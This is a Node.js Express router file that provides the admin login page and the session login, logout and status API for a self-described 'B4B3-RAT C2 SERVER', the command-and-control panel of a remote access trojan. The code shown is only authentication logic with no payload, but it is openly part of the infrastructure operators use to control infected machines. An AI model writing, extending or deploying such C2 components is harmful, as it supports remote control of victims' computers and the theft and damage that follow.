"use strict";

const express = require("express");
const { ADMIN_PASS } = require("../config/constants");
const { adminAuthed } = require("../middleware/auth");

const router = express.Router();

const LOGIN_PAGE = (err) => `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>C2 Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0D1B2A;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial,sans-serif}
.card{background:#1A2E42;border:1px solid #243C57;border-radius:16px;padding:48px 56px;width:400px}
h1{color:#F4F7F6;font-size:26px;font-weight:700;margin-bottom:6px}
p{color:#6B7FA3;font-size:14px;margin-bottom:28px}
input{width:100%;background:#0D1B2A;border:1px solid #243C57;border-radius:8px;color:#E8EEF4;font-size:15px;padding:11px 14px;outline:none;margin-bottom:14px}
input:focus{border-color:#00C2A8}
button{width:100%;background:#00C2A8;border:none;border-radius:8px;color:#0D1B2A;font-size:15px;font-weight:700;padding:13px;cursor:pointer}
.mono{font-family:monospace;font-size:12px;color:#00C2A8;letter-spacing:2px;margin-bottom:20px}
.err{color:#F4A261;font-size:13px;margin-top:10px;text-align:center}
</style></head><body>
<div class="card">
  <p class="mono">B4B3-RAT C2 SERVER</p>
  <h1>Admin Login</h1>
  <p>Authorized personnel only.</p>
  <form method="POST" action="/login">
    <input type="password" name="pass" placeholder="Admin password" autofocus autocomplete="current-password">
    <button type="submit">Sign In</button>
  </form>
  ${err ? '<p class="err">Incorrect password.</p>' : ""}
</div></body></html>`;

// Form-based login (for direct browser access to the backend URL)
router.get("/login",  (_req, res) => res.send(LOGIN_PAGE(false)));
router.post("/login", (req, res) => {
  if (req.body.pass === ADMIN_PASS) {
    req.session.admin = true;
    return res.redirect("/");
  }
  res.send(LOGIN_PAGE(true));
});
router.get("/logout", (req, res) => { req.session.destroy(); res.redirect("/login"); });

// Redirect to dashboard if already logged in
router.get("/", (req, res) => {
  if (adminAuthed(req)) return res.json({ ok: true, message: "B4B3-RAT C2 API" });
  res.redirect("/login");
});

// ── JSON API for separate frontend ───────────────────────────────────────────

router.post("/api/auth/login", (req, res) => {
  const pass = req.body.pass || req.body.password || "";
  if (pass === ADMIN_PASS) {
    req.session.admin = true;
    req.session.save((err) => {
      if (err) return res.status(500).json({ ok: false, error: "Session save failed" });
      res.json({ ok: true });
    });
    return;
  }
  res.status(401).json({ ok: false, error: "Incorrect password" });
});

router.get("/api/auth/logout", (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

router.get("/api/auth/me", (req, res) => {
  res.json({ loggedIn: adminAuthed(req) });
});

module.exports = router;
